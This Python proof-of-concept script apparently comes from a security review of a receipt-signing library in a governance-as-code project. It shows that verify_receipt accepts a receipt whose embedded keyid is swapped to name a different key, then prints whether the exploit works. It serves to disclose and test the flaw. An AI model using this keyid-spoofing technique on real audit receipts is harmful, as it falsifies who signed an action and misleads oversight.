#!/usr/bin/env python3
"""PoC 8 — S2.3: keyid is NOT bound to the verifying key — a lying keyid PASSes silently.

verify_receipt(receipt, public_key) never compares sigs[0]["keyid"] against
keyid(public_key), nor even flags a mismatch in reasons. Any downstream
tooling that resolves or logs trust by the embedded keyid is acting on
attacker-controlled metadata that the verifier implicitly ratifies with PASS.
"""
import copy, sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (build_receipt, generate_keypair, verify_receipt,
                         sha256_hex, keyid)

HUMAN = {"type": "human", "id": "s.lutar", "is_service_account": False,
         "auth_method": "hardware_key", "human_principal": "Stephen P. Lutar"}
POL = {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]

sk, pk = generate_keypair()
sk_victim, pk_victim = generate_keypair()

r = build_receipt(action_id="a-001", subject_name="prod:svc", actor=HUMAN,
                  policy_decision=POL,
                  execution={"side_effect_class": "READ_ONLY", "status": "EXECUTED"},
                  evidence_items=EV, prev_chain_hash="GENESIS", signing_key=sk)

t = copy.deepcopy(r)
real_keyid = keyid(pk)
t["signatures"][0]["keyid"] = keyid(pk_victim)   # claim: signed by the VICTIM's key
v = verify_receipt(t, pk)
print("embedded keyid (claimed):", t["signatures"][0]["keyid"])
print("actual signer keyid     :", real_keyid)
print("verdict:", v.verdict, "| reasons:", v.reasons)

# Unexpected PASS: receipt asserting a DIFFERENT signer's keyid verifies with
# no mismatch reason — keyid is unauthenticated, unverified metadata.
if v.verdict == "PASS" and not any("keyid" in reason.lower() for reason in v.reasons):
    print("EXPLOIT-WORKS")
else:
    print("HELD")
